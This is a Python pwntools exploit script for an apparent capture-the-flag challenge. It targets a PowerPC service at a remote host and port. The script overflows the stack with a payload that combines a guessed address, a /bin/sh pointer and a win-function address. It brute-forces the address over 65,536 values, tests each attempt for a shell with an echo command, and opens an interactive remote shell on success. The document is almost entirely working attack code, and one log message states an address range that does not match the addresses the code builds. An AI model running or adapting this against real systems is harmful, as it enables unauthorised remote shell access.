from pwn import *
import sys

# Configuration
HOST = 'sp33d.play.hfsc.tf'
PORT = 20020
BINSH_ADDR = 0x10077a8c
WIN_PLUS_24 = 0x10000610
TIMEOUT = 0.5

context.log_level = 'info'
context.arch = 'powerpc'

# Function to try a specific address
def try_exploit(addr):
    try:
        p = remote(HOST, PORT, timeout=TIMEOUT)
        p.recvuntil(b"pwn: ", timeout=TIMEOUT)
        
        # Craft payload
        payload = p32(addr) * 6
        payload += p32(BINSH_ADDR)
        payload += p32(WIN_PLUS_24)
        payload += p32(addr) * 2
        
        p.sendline(payload)
        
        # Test if we have a shell by trying to run a command
        p.sendline(b"echo SHELLTEST")
        response = p.recvline(timeout=0.5)
        
        # If we see our test string, we have a shell
        if b"SHELLTEST" in response:
            log.success(f"SUCCESS with address 0x{addr:08x}!")
            
            # Get interactive shell
            p = remote(HOST, PORT, timeout=TIMEOUT)
            p.recvuntil(b"pwn: ", timeout=TIMEOUT)
            p.sendline(payload)
            p.interactive()
            return True
        
        # No shell found
        p.close()
        return False
    
    except EOFError:
        # Handle EOF separately
        try:
            p.close()
        except:
            pass
        return False
    
    except Exception as e:
        # Handle other exceptions
        try:
            p.close()
        except:
            pass
        return False

# Check command line arguments for start position
start_high = 0
start_low = 0

if len(sys.argv) > 2:
    start_high = int(sys.argv[1], 16)
    start_low = int(sys.argv[2], 16)
    log.info(f"Starting from 0x{start_high:02x}{start_low:02x}")

# Start at the specified position and test all combinations
log.info(f"Testing all addresses from 0x40{start_high:02x}{start_low:02x}28 to 0x40FF28")

for high_byte in range(start_high, 256):
    for low_byte in range(start_low if high_byte == start_high else 0, 256):
        addr = (0x40 << 24) | (high_byte << 16) | (low_byte << 8) | 0x38
        
        # Print progress (every 256 attempts)
        if low_byte == 0:
            log.info(f"Testing addresses with high byte 0x{high_byte:02x}...")
        
        if try_exploit(addr):
            sys.exit(0)
